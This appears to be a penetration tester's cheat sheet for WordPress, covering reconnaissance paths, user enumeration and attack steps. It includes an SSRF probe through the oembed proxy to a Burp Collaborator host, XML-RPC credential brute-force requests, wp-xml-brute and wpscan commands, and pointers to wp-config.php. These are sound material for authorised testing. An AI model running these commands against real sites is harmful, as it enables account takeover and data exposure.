
Source
    https://wordpress.org/download/
Hacks
    https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/wordpress
    https://cheatsheet.haax.fr/web-pentest/content-management-system-cms/wordpress/
Auto
    wpscan
    nmap
    nikto
    OpenVAS
    CMSMap
    msfconsole
        scanner/http/wordpress_scanner
    Burpsuite 


########################################
######## Information Gathering
########################################

# Entitiy
1. Core
2. Plugins
3. Themes
4. xmlrpc.php
5. Users
6. Directory

# WordPress Files
Basics
    /readme.html
    /index.php
    /license.txt
    /wp-activate.php
    /wp-sitemap.xml
    /robots.txt
    /sitemap.xml
    /feed
    /wp-includes/functions.php
    /xmlrpc.php
Configuration files
    /.htaccess
    /wp-config.php
    /_wpeprivate/config.json
Content
    /wp-content/
    /wp-content/plugins/
    /wp-content/themes/
    /wp-includes/
    /uploads/
    /upload/
    /images/
    /wp-content/uploads/2018/08/a.txt
    /wp-content/themes/twentytwelve/404.php
    /wp-content/themes/default/404.php
Login folders
    /wp-admin/login.php
    /wp-admin/wp-login.php
    /login.php
    /wp-login.php
    /wp-login/
    /wp-admin/
    /wp-admin.php
    /login/
xmlrpc.php
    curl @xmlrpc .../xmlrpc.php --data "<methodCall><methodName>system.listMethods</methodName><params></params></methodCall>"
    ./wp-xml-brute http://target.com/xmlrpc.php passwords.txt username1


########################################
######## Enumeration
########################################

1. Core
Version
    curl https://victim.com/ | grep 'content="WordPress'
    <meta name="generator"
    CSS link files
    JavaScript files
Vulnerability
    https://patchstack.com/database/
    https://wpscan.com/wordpress/60/

2. Plugins

3. Themes

4. xmlrpc.php
    curl @xmlrpc .../xmlrpc.php --data "<methodCall><methodName>system.listMethods</methodName><params></params></methodCall>"

5. Users
Roles
    - Administrator
    - Editor: Publish and manages his and others posts
    - Author: Publish and manage his own posts
    - Contributor: Write and manage his posts but cannot publish them
    - Subscriber: Browser posts and edit their profile
Enumeration
    /?author=XXX
    /wp-json/wp/v2/users
    /wp-json/oembed/1.0/embed?url=POST-URL
    /wp-json/wp/v2/pages
    /wp-json/?rest_route=/wp/v2/users
    [wpscan] 
        wpscan --url https://$TARGET --random-user-agent --enumerate u --output wpscan.usernames --api-token $WP_TOKEN

6. Directory Indexing
    /robots.txt
    /sitemap.xml
    url.sh: katana, waybackurls


########################################
######## Exploit
########################################

1. Core
    - /wp-json/oembed/1.0/proxy - SSRF
        https://worpress-site.com/wp-json/oembed/1.0/proxy?url=ybdk28vjsa9yirr7og2lukt10s6ju8.burpcollaborator.net

2. Plugins
    - WooCommerce < 7.9 - Unauthenticated Sensitive Information Disclosure

3. Themes

4. xmlrpc.php

5. Users
    - Credentials Bruteforce
        POST /xmlrpc.php <methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>admin</value></param><param><value>pass</value></param></params></methodCall>
    - Create User, login.

6. Directory

